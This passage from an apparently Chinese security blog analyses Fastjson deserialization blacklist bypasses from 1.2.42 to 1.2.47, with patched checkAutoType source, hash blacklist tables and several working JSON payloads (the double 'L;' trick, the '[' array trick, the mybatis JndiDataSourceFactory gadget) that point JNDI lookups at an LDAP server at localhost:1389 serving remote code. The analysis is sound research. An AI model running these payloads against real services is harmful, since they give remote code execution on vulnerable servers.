<td>0xc963695082fd728eL</td>
<td>org.apache.commons.dbcp</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-2753427844400776271</td>
<td>0xd9c9dbf6bbd27bb1L</td>
<td>com.ibatis.sqlmap.engine.datasource</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-1589194880214235129</td>
<td>0xe9f20bad25f60807L</td>
<td>org.jdom.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>1073634739308289776</td>
<td>0xee6511b66fd5ef0L</td>
<td>org.slf4j.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>5688200883751798389</td>
<td>0x4ef08c90ff16c675L</td>
<td>javassist.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>7017492163108594270</td>
<td>0x616323f12c2ce25eL</td>
<td>oracle.net</td>
</tr>
<tr>
<td>1.2.46</td>
<td>8389032537095247355</td>
<td>0x746bd4a53ec195fbL</td>
<td>org.jaxen.</td>
</tr>
<tr>
<td>1.2.48</td>
<td>1459860845934817624</td>
<td>0x144277b467723158L</td>
<td>java.net.InetAddress</td>
</tr>
<tr>
<td>1.2.48</td>
<td>8409640769019589119</td>
<td>0x74b50bb9260e31ffL</td>
<td>java.lang.Class</td>
</tr>
<tr>
<td>1.2.49</td>
<td>4904007817188630457</td>
<td>0x440e89208f445fb9L</td>
<td>com.alibaba.fastjson.annotation</td>
</tr>
<tr>
<td>1.2.59</td>
<td>5100336081510080343</td>
<td>0x46c808a4b5841f57L</td>
<td>org.apache.cxf.jaxrs.provider.</td>
</tr>
<tr>
<td>1.2.59</td>
<td>6456855723474196908</td>
<td>0x599b5c1213a099acL</td>
<td>ch.qos.logback.</td>
</tr>
<tr>
<td>1.2.59</td>
<td>8537233257283452655</td>
<td>0x767a586a5107feefL</td>
<td>net.sf.ehcache.transaction.manager.</td>
</tr>
<tr>
<td>1.2.60</td>
<td>3688179072722109200</td>
<td>0x332f0b5369a18310L</td>
<td>com.zaxxer.hikari.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-4401390804044377335</td>
<td>0xc2eb1e621f439309L</td>
<td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-1650485814983027158</td>
<td>0xe9184be55b1d962aL</td>
<td>org.apache.openjpa.ee.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-1251419154176620831</td>
<td>0xeea210e8da2ec6e1L</td>
<td>oracle.jdbc.rowset.OracleJDBCRowSet</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-9822483067882491</td>
<td>0xffdd1a80f1ed3405L</td>
<td>com.mysql.cj.jdbc.admin.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>99147092142056280</td>
<td>0x1603dc147a3e358L</td>
<td>oracle.jdbc.connector.OracleManagedConnectionFactory</td>
</tr>
<tr>
<td>1.2.61</td>
<td>3114862868117605599</td>
<td>0x2b3a37467a344cdfL</td>
<td>org.apache.ibatis.parsing.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>4814658433570175913</td>
<td>0x42d11a560fc9fba9L</td>
<td>org.apache.axis2.jaxws.spi.handler.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>6511035576063254270</td>
<td>0x5a5bd85c072e5efeL</td>
<td>jodd.db.connection.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>8925522461579647174</td>
<td>0x7bddd363ad3998c6L</td>
<td>org.apache.commons.configuration.JNDIConfiguration</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-9164606388214699518</td>
<td>0x80d0c70bcc2fea02L</td>
<td>org.apache.ibatis.executor.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-8649961213709896794</td>
<td>0x87f52a1b07ea33a6L</td>
<td>net.sf.cglib.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-5764804792063216819</td>
<td>0xafff4c95b99a334dL</td>
<td>com.mysql.cj.jdbc.MysqlDataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-4438775680185074100</td>
<td>0xc2664d0958ecfe4cL</td>
<td>aj.org.objectweb.asm.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-3319207949486691020</td>
<td>0xd1efcdf4b3316d34L</td>
<td>oracle.jdbc.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-2192804397019347313</td>
<td>0xe1919804d5bf468fL</td>
<td>org.apache.commons.collections.comparators.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-2095516571388852610</td>
<td>0xe2eb3ac7e56c467eL</td>
<td>net.sf.ehcache.hibernate.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4750336058574309</td>
<td>0x10e067cd55c5e5L</td>
<td>com.mysql.cj.log.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>218512992947536312</td>
<td>0x3085068cb7201b8L</td>
<td>org.h2.jdbcx.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>823641066473609950</td>
<td>0xb6e292fa5955adeL</td>
<td>org.apache.commons.logging.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>1534439610567445754</td>
<td>0x154b6cb22d294cfaL</td>
<td>org.apache.ibatis.reflection.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>1818089308493370394</td>
<td>0x193b2697eaaed41aL</td>
<td>org.h2.server.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2164696723069287854</td>
<td>0x1e0a8c3358ff3daeL</td>
<td>org.apache.ibatis.datasource.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2653453629929770569</td>
<td>0x24d2f6048fef4e49L</td>
<td>org.objectweb.asm.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2836431254737891113</td>
<td>0x275d0732b877af29L</td>
<td>flex.messaging.util.concurrent.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3089451460101527857</td>
<td>0x2adfefbbfe29d931L</td>
<td>org.apache.ibatis.javassist.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3718352661124136681</td>
<td>0x339a3e0b6beebee9L</td>
<td>org.apache.ibatis.ognl.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4046190361520671643</td>
<td>0x3826f4b2380c8b9bL</td>
<td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6280357960959217660</td>
<td>0x5728504a6d454ffcL</td>
<td>org.apache.ibatis.scripting.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6734240326434096246</td>
<td>0x5d74d3e5b9370476L</td>
<td>com.mysql.cj.jdbc.MysqlXADataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>7123326897294507060</td>
<td>0x62db241274397c34L</td>
<td>org.apache.commons.collections.functors.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>8488266005336625107</td>
<td>0x75cc60f5871d0fd3L</td>
<td>org.apache.commons.configuration</td>
</tr>
</tbody></table>
<p>目前未知的哈希黑名单：</p>
<table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.42</td>
<td>33238344207745342</td>
<td>0x761619136cc13eL</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>-6316154655839304624</td>
<td>0xa85882ce1044c450L</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>-5472097725414717105</td>
<td>0xb40f341c746ec94fL</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>-4608341446948126581</td>
<td>0xc00be1debaf2808bL</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>3256258368248066264</td>
<td>0x2d308dbbc851b0d8L</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>4841947709850912914</td>
<td>0x43320dc9d2ae0892L</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>6534946468240507089</td>
<td>0x5ab0cb3071ab40d1L</td>
<td></td>
</tr>
</tbody></table>
<p>关键是在<code>ParserConfig.java</code>中修改了以下两点：</p>
<ol>
<li>修改明文黑名单为黑名单hash</li>
<li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li>
</ol>
<p>对于第二点，仔细跟进去看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hash算法常量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> BASIC = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> PRIME = <span class="number">0x100000001b3L</span>;</span><br><span class="line">        <span class="comment">// 对传入类名的第一位和最后一位做了hash，如果是L开头，;结尾，删去开头结尾</span></span><br><span class="line">        <span class="comment">// 可以发现这边只进行了一次删除</span></span><br><span class="line">        <span class="keyword">if</span> ((((BASIC</span><br><span class="line">                ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">                * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 计算处理后的类名的前三个字符的hash</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> h3 = (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">                * PRIME;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="comment">//基于前三个字符的hash结果继续进行hash运算</span></span><br><span class="line">            <span class="comment">//这边一位一位运算比较其实就相当于之前的startswith，开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="comment">//将运算结果跟白名单做比对</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将运算结果跟黑名单做比对</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//之后就是一样的处理，根据类名加载类</span></span><br></pre></td></tr></table></figure>

<p>确实有效的干掉了L开头；结尾的payload。</p>
<h1 id="1-2-42-绕过"><a href="#1-2-42-绕过" class="headerlink" title="1.2.42 绕过"></a>1.2.42 绕过</h1><p>但是在以上的处理中，发现只删除了一次开头的<code>L</code>和结尾的<code>;</code>，这里就好像使用黑名单预防SQL注入，只删除了一次敏感词汇的防御错误一样，重复一下就可以被轻易的绕过。所以payload如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>关键PoC为：<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code></p>
<p>在1.2.22-1.2.42版本运行都能成功触发：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706130109049.png" alt="image-20200706130109049"></p>
<h2 id="绕过分析-1"><a href="#绕过分析-1" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">denyHashCodes = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;-<span class="number">8720046426850100497L</span>,-<span class="number">8109300701639721088L</span>,-<span class="number">7966123100503199569L</span>,-<span class="number">7766605818834748097L</span>,-<span class="number">6835437086156813536L</span>,-<span class="number">4837536971810737970L</span>,-<span class="number">4082057040235125754L</span>,-<span class="number">2364987994247679115L</span>,-<span class="number">1872417015366588117L</span>,-<span class="number">254670111376247151L</span>,-<span class="number">190281065685395680L</span>,<span class="number">33238344207745342L</span>,<span class="number">313864100207897507L</span>,<span class="number">1203232727967308606L</span>,<span class="number">1502845958873959152L</span>,<span class="number">3547627781654598988L</span>,<span class="number">3730752432285826863L</span>,<span class="number">3794316665763266033L</span>,<span class="number">4147696707147271408L</span>,<span class="number">5347909877633654828L</span>,<span class="number">5450448828334921485L</span>,<span class="number">5751393439502795295L</span>,<span class="number">5944107969236155580L</span>,<span class="number">6742705432718011780L</span>,<span class="number">7179336928365889465L</span>,<span class="number">7442624256860549330L</span>,<span class="number">8838294710098435315L</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>在checkAutoType()函数中，通过调试发现这段代码会对”L”开头和”;”结尾的类名进行一次提取操作：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706130507612.png" alt="image-20200706130507612"></p>
<p>但由于只进行一次提取操作，因此可以通过添加两次的方式来绕过后面的黑名单校验。</p>
<p>后面的代码，是对提取出来的className即<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>进行denyList黑名单过滤，也就顺利绕过了。</p>
<p>注意下，在后面调用TypeUtils.loadClass()函数时，传入的是我们输入的<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code>。</p>
<p>为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名。</p>
<h1 id="1-2-43-漏洞修复"><a href="#1-2-43-漏洞修复" class="headerlink" title="1.2.43 漏洞修复"></a>1.2.43 漏洞修复</h1><p>在1.2.43中对于1.2.42版本可绕过的情况进行了修复。</p>
<p>修改了<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>的部分代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hash计算基础参数</span></span><br><span class="line">            <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="comment">//L开头，；结尾</span></span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="comment">//LL开头</span></span><br><span class="line">                <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">                    <span class="comment">//直接爆出异常</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>可见就对了LL开头的绕过进行了封堵。</p>
<p>至此我们之前的两个利用链JdbcRowSetImpl和TemplatesImpl正式被封堵了（暂时）。在服务端放开白名单限制的情况下也绕不过黑名单。更别说服务端默认是开启白名单的，这时候fastjson的风险已经很小了。</p>
<p>之后就是不断有新的组件作为利用链引入进行攻击，和黑名单的不断扩充之间的拉锯战。（之前也说过着一切都是在显性关闭白名单的情况下）</p>
<h1 id="1-2-43-绕过"><a href="#1-2-43-绕过" class="headerlink" title="1.2.43 绕过"></a>1.2.43 绕过</h1><p>之前在类的加载<code>TypeUtils.loadClass</code>发现有两种特殊处理方式：</p>
<ul>
<li>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</li>
<li>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</li>
</ul>
<p>之前版本都是主攻第二种，这里的绕过方式就是针对的第一种，也就是针对<code>[</code>的骚操作。</p>
<p>先直接上payload嗷：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>[&#123;,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>关键PoC：<code>[com.sun.rowset.JdbcRowSetImpl</code></p>
<p>但是如果我们一开始payload直接这样写是会报错的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>报错信息如下，显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: exepct <span class="string">'['</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>因此改下payload，在第一个逗号前面加个”[“：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>[,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的”[“字符的后一个位置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure>

<p>因此就修改得到最终版payload，能够成功触发：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706143651966.png" alt="image-20200706143651966"></p>
<h2 id="绕过分析-2"><a href="#绕过分析-2" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144236090.png" alt="image-20200706144236090"></p>
<p>解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144524443.png" alt="image-20200706144524443"></p>
<p>在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”{“等，前面一开始尝试的几个payload报错的原因正是出在这里：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144631729.png" alt="image-20200706144631729"></p>
<h1 id="1-2-44-漏洞修复"><a href="#1-2-44-漏洞修复" class="headerlink" title="1.2.44 漏洞修复"></a>1.2.44 漏洞修复</h1><p>修补了上面的<code>[</code>利用方式。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706145821383.png" alt="image-20200706145821383"></p>
<p>直接抛异常，难受住，家人们；</p>
<h1 id="1-2-44-绕过"><a href="#1-2-44-绕过" class="headerlink" title="1.2.44 绕过"></a>1.2.44 绕过</h1><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p>
<p>maven：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.4.6&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<p>直接给出payload，要连LDAP或RMI都可以：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="string">"properties"</span>:&#123;<span class="string">"data_source"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>关键PoC：<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
<p>主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.45的版本中可以看到：</p>
<table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.46</td>
<td>-8083514888460375884</td>
<td>0x8fd1960988bce8b4L</td>
<td>org.apache.ibatis.datasource</td>
</tr>
</tbody></table>
<p>黑名单封堵呢，其实是一个动态的过程，会有很多新增的jar包，如果服务端引入了这些额外的jar包，就会引入一条可利用链，，或者jdk又被发掘出了新增的链等等都会导致黑名单可被绕过。当然在1.2.25之后这都是要在显性白名单的情况下，才有的问题。</p>
<p>之后更新的版本比如1.2.46也都在补充黑名单。</p>
<p>运行即可成功触发，害怕：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706151641022.png" alt="image-20200706151641022"></p>
<h2 id="绕过分析-3"><a href="#绕过分析-3" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过checkAutoType()函数的检测。</p>
<p>继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。</p>
<p>由于payload中设置了properties属性值，且JndiDataSourceFactory.setProperties()方法满足之前说的Fastjson会自动调用的setter方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。</p>
<p>直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即<code>InitialContext.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的,这里面还是需要调试时候直接断点跳转的：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706154549939.png" alt="image-20200706154549939"></p>
<p>之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。</p>
<p>函数调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">10</span>, Exploit</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">57</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">526</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">383</span>, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">188</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1086</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">544</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">203</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">411</span>, InitialContext (javax.naming)</span><br><span class="line">setProperties:<span class="number">56</span>, JndiDataSourceFactory (org.apache.ibatis.datasource.jndi)</span><br><span class="line">deserialze:-<span class="number">1</span>, FastjsonASMDeserializer_1_JndiDataSourceFactory (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">267</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">384</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1356</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1322</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">152</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">162</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">131</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">8</span>, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure>

<h1 id="1-2-47-通杀！"><a href="#1-2-47-通杀！" class="headerlink" title="1.2.47 通杀！"></a>1.2.47 通杀！</h1><p>我们在分析1.2.47时，将从一个挖掘0day的角度去一步步分析，企图复现这个漏洞的挖掘过程，不然正向看，不得劲。payload在最后给出。</p>
<p>我们重新来理一下<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>这个阻挠我们的方法，上面我们提到过白名单开关时我们走的是不一样的路线，还在注释中提到会有一些固定类型的判断，这就是通杀payload的关键。</p>
<p>我们接下来看的是1.2.47版本的包，我们看总结后的代码结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="comment">//1.typeName为null的情况，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.typeName太长或太短的情况，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.替换typeName中$为.，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.使用hash的方式去判断[开头，或L开头;结尾，直接报错</span></span><br><span class="line">        <span class="comment">//这里经过几版的修改，有点不一样了，但是绕不过，也略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.autoTypeSupport为true(白名单关闭)的情况下，返回符合白名单的，报错符合黑名单的</span></span><br><span class="line">        <span class="comment">//(这里可以发现，白名单关闭的配置情况下，必须先过黑名单，但是留下了一线生机)</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//要求满足黑名单并且从一个Mapping中找不到这个类才会报错，这个Mapping就是我们的关键</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) 